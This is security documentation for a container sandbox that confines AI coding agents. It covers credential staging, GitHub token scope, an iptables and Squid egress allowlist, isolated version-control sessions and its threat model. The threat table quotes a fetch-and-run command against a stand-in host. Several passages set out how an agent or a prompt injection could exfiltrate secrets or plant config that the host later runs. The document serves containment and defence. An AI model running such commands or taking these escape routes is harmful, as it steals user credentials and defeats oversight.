# Security Model

## Credential Isolation

Direct named-agent runs forward only the selected agent's staged credentials:
Claude receives Claude credentials, Codex receives Codex credentials, OpenCode
receives OpenCode credentials, Pi receives Pi credentials, and Copilot receives
only its GitHub token. The same rule
applies to headless modes. Provisioning is presence-driven, so credential files
are created in the container home only when the corresponding read-only secret
mount was authorized and supplied.

`--agent bash` is intentionally a multi-agent environment: every detected
supported agent credential is mounted and can be read by any process in that
session. The one exception is the Copilot token, which is never mounted into a
bash session (see [GitHub Copilot token](#github-copilot-token)). Use
`--no-forward-credentials` when a bash session should start unauthenticated.
The generated devcontainer receives no credentials at all (see
[Devcontainer](#devcontainer)).

The private `/tmp/project-sandbox-<uid>/...` staging tree is host-side storage,
not a mount exposed as a whole. Individual authorized credential directories are
mounted at `/project-sandbox-secrets/<agent>`; credentials are never placed in
the generated configuration directories or image build context. Explicit
`--mount` values are user-authorized exposure and can still reveal any host path
the user chooses, including a credential-bearing path.

Claude's forwarded files are its OAuth credentials (`~/.claude/.credentials.json`
or the macOS Keychain entry), a sanitized `~/.claude.json`, and, when present,
`~/.claude/remote-settings-consent.json`. The consent file records that the host
user accepted their organization's server-managed settings. Forwarding it means
a sandboxed Claude session can skip the managed settings dialog for those same
settings. If they change, Claude Code prompts again inside the container.

## GitHub Copilot token

`--agent copilot` authenticates with a GitHub token rather than an agent-specific
credential file. The token is resolved on the host at every launch (see
[usage](usage.md#github-copilot)), so there is no OAuth refresh or expiry
tracking for Copilot.

- **Scope.** The preferred source is a fine-grained PAT in pass with only the
  "Copilot Requests" permission: it can call Copilot and nothing else. The
  fallback, `gh auth token`, returns the GitHub CLI's token, which commonly has
  `repo` and `workflow` scope. While GitHub is reachable (Copilot implies
  `--allow-github`), an agent or a prompt injection holding that token could
  push branches, edit workflows, or read private repositories. Every run that
  falls back to `gh` prints a `[W]` warning naming the pass entry to fill.
  Classic `ghp_` tokens are rejected.
- **Where it lives.** The token is written to a 0600 file in a 0700 directory
  under `/tmp/project-sandbox-<uid>/` (outside the repository, rewritten every
  launch, removed best-effort at session end) and mounted read-only at
  `/project-sandbox-secrets/copilot` only when Copilot is the selected agent. It
  is never baked into the image, written into generated project files, passed
  in argv, or copied into `$COPILOT_HOME`. Resolved tokens are redacted from
  headless session logs and live output.
- **Who can read it.** The entrypoint exports `COPILOT_GITHUB_TOKEN` only for
  the Copilot process. That process environment is inherited by the shell
  tools Copilot runs, so anything Copilot executes can read the token. This is
  inherent to how Copilot CLI reads tokens; a plaintext token file in
  `$COPILOT_HOME` would be no better. The PAT path limits what a leaked token
  can do. Bash sessions and other agents never receive it.
- **Built-in MCP servers are disabled** (`--disable-builtin-mcps`), because the
  built-in GitHub MCP server would use the same token to act on GitHub.

## Unsupervised session history

A run with `--prompt` or `--prompt-text` is unsupervised. These runs retain the
agent settings needed to execute the task, but omit persistent shell history
and Claude conversation-history mounts. OpenCode staging keeps its
`opencode.json` / `opencode.jsonc` configuration and only the provider credentials
in `.local/share/opencode/auth.json`; it excludes session databases, logs,
caches, and all `.local/state/opencode` files. This authentication file location
is documented in [OpenCode's provider guide](https://opencode.ai/docs/providers/).
OpenCode configuration entries must be files; directories with those names are
not recursively staged. Staging is cleared before each sync. Unsupervised
OpenCode credentials use a separate host staging directory, so a later interactive
run cannot add history to an unsupervised container's credential mount.
Codex and Pi also stage only credential files; a directory named `auth.json`
is never copied recursively. Prompt mounts expose only the current staged file,
so older files in the prompt staging directory remain hidden.
Interactive runs continue to forward OpenCode's data and state.

In every mode, `/workspace/.project-sandbox` is masked with an empty read-only
mount, hiding generated host configuration and host session logs. Project files
and explicitly requested extra mounts remain accessible; history stored there
is outside this automatic isolation.

## OAuth Token Lifetime

Agent OAuth access tokens are short-lived and the refresh tokens that renew them
are single-use. If an agent refreshed its token inside the `--rm` container, the
rotated token would be discarded on exit, logging the host out, and parallel
containers sharing one host login would race on the single-use refresh token and
invalidate each other. Two host-side measures keep the in-container token valid
for as long as possible and make any shortfall visible:

- **Host pre-launch refresh.** Before staging, `project-sandbox` runs the agent's
  own CLI on the host (`claude auth status` / `codex login status`) so the tool
  refreshes and persists its token using its own maintained logic; the refreshed
  credential is then staged, so the container starts with a near-full window.
  The CLI runs from an empty private directory, not from the project, so
  project settings such as Claude's `apiKeyHelper` and hooks or Codex's
  `.codex/` config are not loaded (see [Host commands](#host-commands)).
  This runs under a per-agent lock, is best-effort, and is skipped with
  `--no-token-refresh`. OpenCode and Pi have no delegated refresh.
- **Start-of-session warning.** When credentials are forwarded, the launch prints
  the remaining lifetime of the staged token (`claudeAiOauth.expiresAt` for
  Claude; the `exp` claim of the Codex access-token JWT). If the session outlives
  it, the in-container agent refreshes the token using the host's single-use
  refresh token. The session keeps working, but that rotation invalidates the
  host login, so you need to re-authenticate on the host and re-run to re-stage
  afterward. Sessions are not killed at the deadline. For OpenCode, the
  soonest-expiring OAuth provider in its `auth.json` is used; long-lived/API-key
  providers carry no host-logout risk and show no warning. Pi's `auth.json`
  shape is not yet parsed by this check (deferred; see `TODO.md`), so no
  expiry warning is shown for Pi and the in-container agent's own refresh
  behavior applies.
- `--no-forward-credentials` starts the container unauthenticated. Host
  credentials are not read, staged, or mounted; any credentials left in the
  staging area by a previous forwarding run are removed. It also disables the host
  refresh and start-of-session warning. Direct CLI runs may opt in to API-key
  environment injection with `--api-key-env NAME` or `--api-key-env-file FILE`;
  dry-runs redact values, but real runs still pass those values through the
  runtime process environment.

OpenCode and Pi can each be configured with multiple providers (BYOK). The
default firewall allows OpenAI and Anthropic endpoints; use `--allow-github`
for GitHub Copilot, or `--extra-domain DOMAIN` for another provider endpoint.
Selecting `--agent pi` (or `opencode`) with the firewall enabled prints a
warning to this effect. Pi also has no built-in permission/confirmation
system, so headless runs always pass `--approve`, trusting the project-local
`.pi/` config for that run; the container's firewall and filesystem
boundaries remain the safety net, consistent with Pi's own "run in a
container" guidance.

## Network Firewall

When the firewall is enabled by default, `init-firewall.sh` runs as root inside
the container and:

- Sets `iptables` and `ip6tables` policies to DROP.
- Pre-resolves allowlisted domains using the resolvers in `/etc/resolv.conf`,
  pins the resulting addresses into `/etc/hosts` and `ipset`, then blocks
  general outbound DNS to close DNS-tunnel exfiltration.
- Allows Claude/Anthropic endpoints (`api.anthropic.com`, `claude.ai`,
  `code.claude.com`, `platform.claude.com`), `api.openai.com`,
  `auth.openai.com`, and `chatgpt.com`.
- When `--allow-github` is set, also allows GitHub's published web/API/git IP
  ranges and DNS-pinned GitHub/Copilot hosts, including `github.com`,
  `api.github.com`, `uploads.github.com`, `codeload.github.com`,
  `lfs.github.com`, `raw.githubusercontent.com`, `objects.githubusercontent.com`,
  `github-cloud.githubusercontent.com`, `api.githubcopilot.com`,
  `api.individual.githubcopilot.com`, `api.business.githubcopilot.com`,
  `api.enterprise.githubcopilot.com`, `copilot-proxy.githubusercontent.com`,
  `origin-tracker.githubusercontent.com`, `copilot-telemetry.githubusercontent.com`,
  `collector.github.com`, and `default.exp-tas.com`.
- `--agent copilot` implies `--allow-github`. GitHub network access is enabled
  only by that flag or by selecting Copilot, never by prompt text: earlier
  releases opened it for `--agent bash` prompts whose first word was `copilot`.
- With `--agent copilot --copilot-host <tenant>.ghe.com`, the sandbox script
  also DNS-pins the tenant's hosts: `<tenant>.ghe.com`, `api.<tenant>.ghe.com`,
  `copilot-api.<tenant>.ghe.com`, and `copilot-telemetry-service.<tenant>.ghe.com`.
  GitHub's allowlist reference lists `*.<tenant>.ghe.com`, which a per-IP
  firewall cannot express, so these are the concrete names Copilot CLI uses; add
  any missing one with `--extra-domain`.
- The firewall never admits the host gateway as a whole. Host services are
  reachable only through the exact address/port pairs listed here.
- When `--pi-ollama` is set, the firewall additionally allows outbound
  TCP to the runtime-adapter-selected host endpoint restricted to port `11434`
  (Ollama's default port). The endpoint is exposed only through the runtime-private native
  mapping or exact Linux bridge listener, but other peers able to reach that
  private runtime network remain in the trust boundary. The fixed hostname is
  pinned where the runtime permits it.
- Rootless Podman on Linux with pasta runs every build and session with its own
  address, `198.18.0.2/24` with gateway `198.18.0.1` (`-a`, `-n`, `-g`), instead
  of pasta's default copy of the host's addresses. Without it, a proxy or
  gateway on the host's own LAN address is unreachable. The range is reserved
  for benchmarking (RFC 2544); a real network in `198.18.0.0/24` is shadowed.
  The gateway does not map to host loopback, and podman's
  `host.containers.internal` (`169.254.1.2`) does not answer in this mode. The
  host's own IPv6 addresses are still copied and remain unreachable.
- Rootless Podman on Linux with pasta forwards each planned host-local service
  port (`-T <port>:<port>`) from the container's loopback to the same port on
  host loopback, IPv4 only (`-4`). The sandbox firewall accepts all loopback
  traffic, so that port list, built from exactly the planned services, is the
  boundary: no other host-loopback port is reachable. A sandbox process
  listening on a forwarded port inside the container conflicts with the forward.
  Services listening only on IPv6 loopback are rejected on this path.
- Ollama itself stays on host loopback. On local Linux bridge modes (Docker
  Engine) a project-sandbox forwarder is bound to the exact validated bridge
  address and port and forwards only to the one recorded loopback address on
  that port. It is shared by the concurrent sessions that use the service, each
  holding a `flock` lease, and exits within about one poll interval (2s) after
  the last lease is released, including a lease released by a killed session.
  A listener owned by another process is refused, never reused, and there is no
  fallback port or wildcard address. Its state is private to the user
  (`$XDG_STATE_HOME/project-sandbox/local-forward/`, directories `0700`, files
  `0600`, symlinks refused). Apple `container` requires the administrator-managed
  `host.docker.internal` localhost DNS mapping described in `docs/usage.md`.
  Creating it can disrupt container Internet access until runtime networking is
  rebuilt and might disable Private Relay, so restart the container system
  immediately afterward.
- Mirrors the IPv4 allowlist into a parallel IPv6 set; falls back to disabling
  IPv6 via `sysctl` when `ip6_tables` is unavailable. The script exits with an
  error if both `ip6tables` and `sysctl` are unavailable.

Domain allowlists are resolved once when the container starts, then pinned as IP
addresses in `ipset`. CDN-backed services can rotate IPs during long sessions; if
an allowlisted service starts failing after it initially worked, restart the
session so the firewall resolves fresh addresses.

Customize:

- `--extra-domain DOMAIN` appends entries to the allowlist, such as
  `registry.npmjs.org`, private registries, or internal APIs. Repeatable.
- `--allow-github` allows GitHub and GitHub Copilot endpoints. This is useful for
  GitHub-backed workflows, but it also creates a viable exfiltration path through
  GitHub.
- `--no-firewall` skips the firewall entirely. Use it only for trusted-network
  debugging.
- `--pi-ollama` (with `--agent pi`) allows the host's Ollama port through the
  selected runtime-private endpoint and bakes Pi's provider config to use it;
  see `docs/usage.md` for the runtime matrix and Apple setup. `--ollama-model` overrides the
  default model list.

## Devcontainer

`project-sandbox --devcontainer` renders a test and debug environment, not an
agent sandbox. No agent runs there, so its profile removes what an agent
session needs and adds nothing in its place:

- **No agents or credentials.** The image installs no agent CLIs.
  `devcontainer.json` mounts no staged credentials, agent configs or Claude
  history, sets no agent environment variables and recommends no agent
  extensions. No credentials are staged for it.
- **No network by default.** `runArgs` contains `--network none`: only
  loopback, enforced by the kernel without capabilities, a firewall script or a
  root step. `--devcontainer-network=runtime` is an explicit, unfiltered opt-in
  to the runtime's default network. It has no firewall or egress policy, and
  the command warns about it. Treat it like your own development environment.
- **No privilege path.** No `--cap-add`, no sudoers rule, no firewall script in
  the image, and a `postStartCommand` that only applies the git/jj identity as
  `agent`. The image keeps build-time CA trust (`--build-ca-cert`) but has no
  session-time trust (`--ca-cert`).
- **Masks.** `/workspace/.devcontainer` and `/workspace/.project-sandbox` are
  masked with an empty read-only mount, after any `--mount` values. Test code
  may come from an agent session, and must not rewrite `devcontainer.json`,
  whose `initializeCommand` runs on the host.

The devcontainer is rendered only on request; launches never rewrite it.

## Node.js + npm images (`--node-npm`)

`--node-npm` generates an image with more third-party code than the other flows:

- **Image contents:** a `debian:trixie-slim` base with the usual sandbox
  tooling, Debian `chromium`, fontconfig, `fonts-liberation`,
  `fonts-noto-color-emoji`, the project's npm dependencies in
  `/opt/node-project/node_modules`, and, when the lockfile contains Playwright,
  Playwright's Chromium in `/opt/ms-playwright` plus the Debian packages its
  `install --with-deps` pulls in. Both `/opt` trees are owned by the agent user.
  This adds several hundred MB to the image.
- **Install scripts run at build time.** `npm ci` executes dependency lifecycle
  scripts (`preinstall`, `install`, `postinstall`) as root during the image
  build, with unrestricted network access; Playwright's browser download runs
  there too. The build has no access to agent credentials or the workspace
  beyond the copied manifests, but a malicious package can tamper with the
  image, and the agent then runs inside that image with the workspace and any
  forwarded credentials mounted. Supply-chain risk is managed through the
  committed lockfile: review lockfile changes and pin versions. The sandbox never runs
  `npm install` for you at runtime (the firewall blocks the registry anyway).
- **Chromium `--no-sandbox`.** Chromium's own sandbox needs user namespaces or a
  setuid helper, which are unavailable to the non-root agent user in the
  container, so browsers must be launched with `--no-sandbox` (Playwright does
  this by default). The container (and, on Apple `container`, the VM) is the
  isolation layer for pages the browser loads; do not point the browser at
  untrusted sites you would not let the agent itself fetch.
- **Runtime `node_modules`.** `/workspace/node_modules` is a tmpfs populated from
  the image, so host-platform binaries in the host's `node_modules` are never
  executed, and changes the agent makes there never reach the host. The
  entrypoint requires a separate tmpfs mount at that exact path and rejects
  symlinks, then copies only when the mount is empty. A plain directory on a
  tmpfs-backed host filesystem does not qualify. If the mount is absent or has
  the wrong filesystem type, the session fails before copying or starting the
  agent.
- **Memory.** The tmpfs and the default `2g` `/dev/shm` count against the
  container's `--memory` limit.

## Threat Model

| Threat | Mitigation |
|---|---|
| Agent reads `~/.ssh`, `~/Library`, etc. | Arbitrary host home directories are not mounted by default. Apple `container` adds a VM boundary; Docker/Podman rely on the host's container isolation. |
| Agent deletes the wrong project directory | The workspace, generated config, staged agent credentials, optional `--mount` entries, and worktree-mode `.git` metadata are the intentional host mounts; everything else lives in the disposable container or VM. |
| Agent exfiltrates the workspace to an arbitrary server | iptables egress allowlist with default DROP and domain whitelist for both IPv4 and IPv6. |
| DNS tunneling exfiltration | Allowlisted domains are pre-resolved at startup and general outbound DNS is blocked afterward. |
| Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
| Malicious npm post-install scripts | Run as the unprivileged `agent` user (host-matched for Docker/Podman on Linux); no access to unmounted host paths. |
| Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` for Claude and `check_for_update_on_startup = false` for Codex; `PI_SKIP_VERSION_CHECK=1` for Pi. OpenCode config is not currently sanitized; see `TODO.md`. |
| Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` for Claude; `analytics.enabled = false` and `feedback.enabled = false` for Codex; `PI_OFFLINE=1` for Pi (disables startup update/telemetry network calls); `OPENSPEC_TELEMETRY=0` for OpenSpec. OpenCode config is not currently filtered for telemetry settings; see `TODO.md`. |
| API token leakage via process environment | Default forwarded agent tokens are passed through mounted credential files, not environment variables; host staging files are kept under a private `/tmp` directory. Explicit `--api-key-env*` injection is opt-in, requires `--no-forward-credentials`, and redacts dry-run output, but the selected keys are still present in the runtime process environment during real runs. |
| Agent rewrites the project `--dockerfile` to poison the next build | The project Dockerfile's SHA256 is recorded under the masked `.project-sandbox/.dockerfile-checksums.json`, which the sandbox cannot read or modify; a later run warns when the Dockerfile changed since it was last built. |
| Agent reads, edits or plants `.devcontainer` config (its `initializeCommand` runs on the host) | `/workspace/.devcontainer` is masked with an empty read-only mount in both direct runs and devcontainers. Sessions create an empty `.devcontainer/` when it is missing, so the mask always applies, and refuse a symlinked one. |

The tool does not protect against:

- Exfiltration via whitelisted endpoints, such as committing secrets to a GitHub
  repo.
- Misuse of an agent's own API token, which is by definition available to the
  agent.
- IPv6 egress when `ip6_tables` is unavailable and `sysctl` cannot disable IPv6;
  the firewall script exits with an error in that case rather than silently
  proceeding.

## Isolated VCS sessions

In a jj project, sessions run in isolated VCS mode unless `--vcs shared` is
given ([usage](usage.md#version-control-modes)). The goal: no host command reads
version-control metadata the agent could write, and the agent can't write
metadata a host command reads.

What is mounted:

| Host | Container | Access |
|---|---|---|
| session directory `W` (`<repo>-workspaces/<bookmark>`), a jj workspace of the main repository | `/workspace` | read-write |
| `W/.jj`, the host's workspace metadata | hidden under the next mount | none |
| private `.jj` (`<repo>-workspaces/.session-vcs/<name>.<id>/jj`) | `/workspace/.jj` | read-write |
| private `.git` (same directory, `git`) | `/workspace/.git` | read-write |
| each `--share PATH` | `/workspace/PATH` | read-only, or read-write with `:rw` |

- The main repository's `.jj` and `.git` are not mounted at all, in whole or in
  part. A `--mount` whose source lies in them, in `W/.jj` or in `.session-vcs/`,
  or whose target covers `/workspace/.jj` or `/workspace/.git`, is refused.
- The private repository is created by the host before the container starts,
  from the files the host just checked out. Its one `session base` commit and
  its `.git` (hooks, config, everything) belong to the agent and are thrown
  away after the session.
- A bind mount point can't be renamed, removed or unmounted from inside the
  container, so the host's `W/.jj` stays out of reach. This was checked on
  Docker Desktop, rootless Podman and Apple `container`, as root with
  `NET_ADMIN` and as the agent user: `mv`, `rmdir` and `rm -rf` of either mount
  point fail with `EBUSY`, `umount` and `mount --bind` fail (no runtime grants
  `CAP_SYS_ADMIN`), and no other path in the container leads to the host
  metadata. `/proc/self/mountinfo` shows the host source paths on Docker and
  Podman; that discloses paths, not contents.

What the host reads at the end:

- Host `jj` snapshots `W` with its own metadata in `W/.jj` and moves the
  bookmark. It reads the files in `W`, including the agent's `.gitignore`
  edits, which decide which new files are recorded. It never opens the private
  repository, and jj runs no hooks.
- Symbolic links the agent created are recorded as links; their targets are
  not read.
- The agent's commits and their messages are not kept. The result is one
  commit whose message the host writes.

Limits:

- Writes through a writable `--share` go straight to the project folder on the
  host, outside the reviewed result commit, and other sessions sharing the
  folder see them. Share writable only what you would let the agent write in
  place anyway.
- The result commit contains whatever the agent wrote into tracked or new,
  non-ignored files, including build scripts, CI config or agent config that
  your tools run later. Review it like any contribution before you merge it.
- Isolated mode needs jj. Git-only projects run with `--vcs shared` or after
  `jj git init --colocate`.

### Shared VCS sessions

With `--vcs shared`, the project is mounted in place and the agent can change
its `.git` and `.jj`, including hooks, config and filters that your host `git`
and `jj` execute later. Every shared launch prints a warning saying so, and only
one shared session may run per repository at a time, so two agents can't race
on the same metadata. Isolated sessions can run beside it. Until the
protections planned for shared mode land (read-only hooks, config restore, a
live watcher), review `.git/hooks`, `.git/config` and the jj config after every
shared session, or use isolated mode.

jj keeps repository config outside the repository, chosen by
`.jj/repo/config-id`. When that file is missing, every jj release, 0.46
included, adopts a `.jj/repo/config.toml` it finds in the repository, so a
shared session can plant config, such as a signing program, for your next `jj`
command. `project-sandbox doctor`, run inside the repository, warns about such
a file.

## Host commands

`project-sandbox` runs some tools on the host: `jj`, `git` (to read your global
identity), the container runtime, `claude` and `codex` (token refresh), `pass`,
`gh` and `security` (credential lookup). A repository the agent can write must
not choose which program runs or what it reads from its working directory:

- **Lookup.** Tools are found only through absolute `PATH` entries outside the
  project and outside `<repo>-workspaces/`. Empty and relative entries (`.`,
  `bin`) are skipped, as is a candidate whose symlink target lies in the
  project. A tool found only that way counts as missing, and `doctor` names
  the skipped entry. For the duration of a launch the process `PATH` is
  narrowed the same way, so the container runtime and the helpers it starts
  are found through trusted entries too.
- **Working directory.** `claude`, `codex`, `pass`, `gh`, `security` and
  `git config --global` run from a private, empty directory (mode 0700) that is
  removed at exit. `git` is asked only for `--global` values, so a project's
  `.git/config` is never read.
- **jj.** Every host `jj` call names its repository with `-R`, runs from the
  same empty directory, and overrides the settings that would make it run a
  program: `signing.behavior=drop`, `fsmonitor.backend=none`,
  `ui.paginate=never`, and `git.executable-path` set to the resolved host
  `git`. Host calls always pass `-m`, so no editor is started.

The container runtime's `build` still runs in its build context, which Apple
`container` requires; the runtime binary itself is found as above.

## Troubleshooting

- **No supported runtime found.** Install Apple `container` on macOS, or
  Docker/Podman on Linux. You can also pass `--runtime docker`,
  `--runtime podman`, or `--runtime apple-container` explicitly.
- **`container system start` failed.** Make sure macOS 15+ is current and
  `apple/container` is installed; the tool calls `container system start`
  idempotently before building when the Apple runtime is selected.
- **Build OOM on Apple `container`.** The builder VM is separate from run VMs.
  Bump it with `container builder start --memory 8g --cpus 8`, then re-run
  `project-sandbox`.
- **Stale image after an out-of-band change.** Builds are skipped when the
  generated inputs are unchanged and the image still exists; the decision uses a
  fingerprint recorded in `.project-sandbox/.build-state.json` (a non-sensitive
  tag + hash). If the image was modified outside project-sandbox, pass
  `--force-build` to rebuild.
- **Host service times out on Apple `container`.** A curl timeout (rather than
  a refusal) reaching the agent proxy, Internet proxy, or Ollama means the
  `host.docker.internal` localhost DNS domain resolves but no longer redirects.
  Delete the domain, re-create it, and restart the container system; see
  [Apple container host alias](apple-container-dns.md).
- **GitHub meta API timeout.** The firewall script falls back to an empty
  `{web,api,git,ipv6}` set and starts with a partial allowlist. Re-running the
  agent later will retry.
- **`ip6tables` unavailable.** The script attempts
  `sysctl net.ipv6.conf.all.disable_ipv6=1` first. If that also fails, the script
  aborts with an error.
- **Credentials look stale.** Re-run `project-sandbox` on the host to refresh the
  `/tmp` credential staging directory from the host agent config or macOS
  Keychain. The CLI also refreshes a near-expiry host Claude token before staging
  unless `--no-token-refresh` is set.
- **Env vars in `vminitd.log`.** apple/container logs the full process
  environment. Default forwarded agent tokens are passed through mounted
  credential files only; identity env vars are low-sensitivity. Values injected
  with `--api-key-env` or `--api-key-env-file` are process environment secrets
  and may appear in runtime metadata or logs.
- **Rootless Podman firewall setup fails.** The default firewall needs
  `NET_ADMIN` and `NET_RAW`. Use a Podman setup that permits those capabilities,
  or pass `--no-firewall` only for trusted-network debugging.

## Limitations

- Dockerfiles passed with `--dockerfile` must use the default backslash (`\\`)
  line-continuation escape. The Dockerfile parser directive ``# escape=` `` is
  not currently honored, so backtick-continued instructions may produce an
  invalid generated Dockerfile.
- Base images, including the final stage of a Dockerfile passed with
  `--dockerfile`, must be Debian or Ubuntu based. The firewall depends on `apt`
  packages including `aggregate`, which Alpine does not ship.
- Direct Python CLI runs support Apple `container`, Docker, and Podman.
  Docker/Podman provide container isolation rather than the Apple MicroVM
  boundary. Incus is a future backend candidate, but it has a different
  image/import and launch lifecycle from the generated Dockerfile flow used here.
- The generated `.devcontainer/` targets local Docker-compatible runtimes such as
  Docker Desktop or OrbStack; remote services may require rewriting local mounts.
- Sessions in jj projects run in isolated VCS mode by default (see
  [Isolated sessions](#isolated-vcs-sessions)); `--vcs shared` mounts the
  project in place with its `.git` and `.jj` writable.
- `jj` is installed in the container and configured with the same global
  name/email identity passed to Git.
# Agent gateway boundary

Proxy mode provides provider-credential isolation, not immunity from local
spend. OpenAI/Anthropic keys and host OAuth state are excluded, but the agent
VM receives the gateway bearer key and can spend through the reachable local
gateway during its session. Pi/OpenCode generated config and Apple `container`'s
Bash env file are mode 0600, scoped to the selected session, redacted from
diagnostics, and removed after use. Docker/Podman Bash sessions inherit only
bare environment names through argv; values travel in the protected subprocess
environment.
Because Bash can launch either bundled agent, Bash proxy sessions mount private
Pi and OpenCode proxy configs in addition to the `OPENAI_*` environment. Both
configs contain the same gateway key, are mode 0600 before mounting, and are
removed from staging after the session.

Proxy-mode egress is gateway-only by default: normal OpenAI/Anthropic domains
are omitted. The exact
forwarded gateway address and TCP port remain allowed. Only explicit
`--extra-domain` and `--allow-github` options widen that policy.

Loopback publishing is not a confinement boundary, particularly with Apple
`container` vmnet. Keep the gateway's strict listener authentication enabled
and never expose an unauthenticated listener. The external gateway's SQLite
request log can contain complete prompts and responses; follow its retention,
inspection, and pruning guidance before using sensitive material.

## Remote proxy endpoints

Agent and Internet proxies can independently use HTTP loopback forwarding or
direct remote HTTP/HTTPS. Internet mode retains default-deny IPv4/IPv6 and
blocks general DNS, direct provider access, and broad gateway exceptions. Each
endpoint is resolved with sandbox-visible DNS before closure, validated, and
pinned for the session with exact TCP address/port permissions. Restart after
DNS rotation. A hostname resolving to loopback, multicast, or an unspecified
address aborts startup. IPv6 enforcement failures abort Internet mode.

An IP/port exception also permits another virtual host on that pair; it is not
an HTTP hostname policy. Verified TLS authenticates names for compliant clients.
Proxy environment variables supply routing hints; removing them does not widen
the firewall. Gateway and Ollama requests bypass the Internet proxy and keep
independent permissions. Agent-only `--no-firewall` provides neither pinning nor
egress enforcement. Operators must provide sandbox reachability to endpoints.

Supplied public CAs extend per-connection host trust and rebuilt image-wide
trust. They never change the host trust store. HTTPS gateway discovery ignores
ambient proxies and follows no redirects, keeping the bearer key on the configured
origin. Internet proxy authentication and client certificates are unsupported;
HTTP 407 does not trigger credential acquisition or direct fallback. See
[proxy endpoints](proxy-endpoints.md) for TLS scope and client limitations.

## Egress sidecar

`--egress sidecar` replaces IP pinning with one global Squid sidecar per
runtime that filters by hostname; see [Egress sidecar](egress-sidecar.md). The
parts that matter for security:

- **The sandbox firewall is the boundary.** A sidecar-mode sandbox runs on the
  runtime's default network and has a route to the network, exactly like a
  firewall-mode sandbox. What keeps it on the sidecar is its own firewall: the
  `internet-proxy` policy of `init-firewall.sh`, run as root before the agent
  starts. It sets `INPUT`, `FORWARD` and `OUTPUT` to default `DROP`, admits new
  outbound TCP only to the sidecar endpoint (`host.docker.internal` on
  `[egress.sidecar] port`, default 3129) and to this session's local services
  or remote agent proxy, drops DNS, and fails closed when it cannot enforce
  IPv6. The agent runs without root, so it cannot change those rules, and
  `--no-firewall` is rejected in this mode.
- **No routing isolation over firewall mode.** Sidecar mode filters by
  hostname, but it does not add network isolation beyond firewall mode: if the
  sandbox firewall failed, the sandbox could reach the network directly. Clients
  that ignore the proxy variables fail closed instead of going around the
  sidecar.
- **The port is open to the host.** The sidecar publishes its proxy on exactly
  one host address: `127.0.0.1`, or on Docker Engine the default bridge's
  gateway (for example `172.17.0.1`). Any process on the host can use it, and so
  can any container that can reach that address (on Apple `container`, every
  container that resolves the localhost alias; on rootless Podman, every
  container whose pasta network forwards the port). Those clients get only what
  `egress.toml` allows, and the sidecar CA is never given to them. Squid's
  `client` log field is therefore the runtime's port forwarder, not a sandbox
  (on rootless Podman it is the host's LAN address), and the session-end denial
  count covers every client.
- **Docker Engine: gateway listeners compared with `linux-bridge-forwarder`.**
  Firewall mode reaches a host-loopback service on Docker Engine through a
  shared project-sandbox forwarder bound to the `docker0` gateway, one per
  service port. Before share-local-service-forwarders this was a per-session
  `socat`, with the same exposure and a single session's lifetime. Sidecar mode
  adds two listeners on the same address:

  | Listener | Bound to | Lifetime | Who can connect | Reaches |
  |---|---|---|---|---|
  | `linux-bridge-forwarder` (firewall mode; Ollama, agent proxy in both modes) | `<gateway>:<service port>` | the union of the sessions that use it, plus about one poll interval (2s) | every container on any Docker bridge | the service on host loopback (one recorded loopback address), unfiltered |
  | Sidecar publish | `<gateway>:3129` | until `project-sandbox-egress down` | every container on any Docker bridge | Squid: only what `egress.toml` allows |
  | Parent forwarder (loopback parent only) | `<gateway>:<free port>` | the sidecar's | the sidecar's bridge address only; every other peer is closed before any upstream connection | the parent on `127.0.0.1:<parent port>` |

  A host listener on a bridge gateway is reachable from containers on every
  bridge, because traffic to a host address takes the host's INPUT path, which
  Docker's inter-bridge isolation does not filter. The sidecar publish is
  therefore exposed like a `linux-bridge-forwarder` listener, but longer-lived, and
  it grants less: a hostname-filtered proxy instead of a raw service. Source
  addresses are preserved on this path, so the forwarder's peer check reliably
  tells the sidecar apart from other containers. The forwarder connects only to
  host loopback on the parent's port, and sandboxes have no firewall rule for
  its port. A host firewall such as ufw may block these listeners; that case is
  untested.
- **One policy, out of reach.** The only policy is
  `$XDG_CONFIG_HOME/project-sandbox/egress.toml`. It and the sidecar state
  directory `$XDG_STATE_HOME/project-sandbox/egress/` (which holds the CA key)
  must lie outside the project, the worktree, `.git`/`.jj` and every `--mount`
  source. This is checked after resolving symlinks at every launch, so the
  agent can neither widen the policy nor read the key. Rendered Squid config
  lives in the state directory, never in the project. Every agent provider host
  is always allowed. A hand edit of `egress.toml` applies to running sandboxes
  at the next launch, `reload` or `allow` edit; that is intended.
- **Squid policy.** Squid refuses IP-literal destinations, CONNECTs to ports
  other than 443, tunnels whose TLS SNI is missing or differs from the CONNECT
  host, and non-TLS tunnels. In direct mode it also refuses names that resolve
  to private, loopback, link-local or metadata addresses. These denials happen
  before any upstream connection is made.
- **Sidecar CA.** The sidecar owns one CA per runtime: EC P-256, `pathlen:0`,
  with critical name constraints, valid for `[egress.ca] lifetime_days`
  (default 7 days, at most 30).
  - The constraint is `github.com` when the Copilot profile intercepts
    `api.github.com`. It cannot be narrower, because Squid mimics GitHub's
    `*.github.com` certificate names.
  - Otherwise the constraint is the reserved name `invalid`, and the CA is not
    mounted into any sandbox.
  - The key lives in `egress/<runtime>/sidecar/ca-key.pem`, mode 0600 in a
    0700 directory, written with `O_EXCL | O_NOFOLLOW`. It is mounted read-only
    into the sidecar only, never into a sandbox, and deleted by
    `project-sandbox-egress down` or when the CA is replaced. It lives as long
    as the sidecar keeps it, at most 30 days.
  - The CA is reused across restarts while it has at least 2 days left and its
    constraints match. While interception is active, launches warn within 2
    days of expiry and refuse to start once it has expired.
  - Only the public certificate enters a sandbox, through the read-only
    per-session mount `/project-sandbox-egress`, and it is installed at
    start-up, never baked into an image.
- **GitHub.** Repository hosts cannot be allowlisted in this mode. The Copilot
  profile admits only `/copilot_internal/` on `api.github.com`. Copilot CLI
  telemetry and its update check are blocked.
- **Parent proxy.** With `[egress.upstream] url`, the sidecar's policy is
  hostname-only. The parent may reach intranet hosts, so the allowlist is the
  only barrier to them. The upstream CA (`ca_cert`) is installed into each
  sandbox's trust at start, not baked into its image. On Apple `container` the
  relay to a remote parent is a host process that persists while the sidecar
  is up and listens on `127.0.0.1` only. A parent on host loopback is never
  reachable from sandboxes: on rootless Podman only the sidecar's pasta network
  forwards its port; on Docker Engine only the sidecar passes the parent
  forwarder's peer check.
- **Rootless Docker** is rejected in sidecar mode before any container work.
- **Restarts.** `down` and `restart` do not check for users: running sidecar
  sandboxes lose their connections and fail closed.
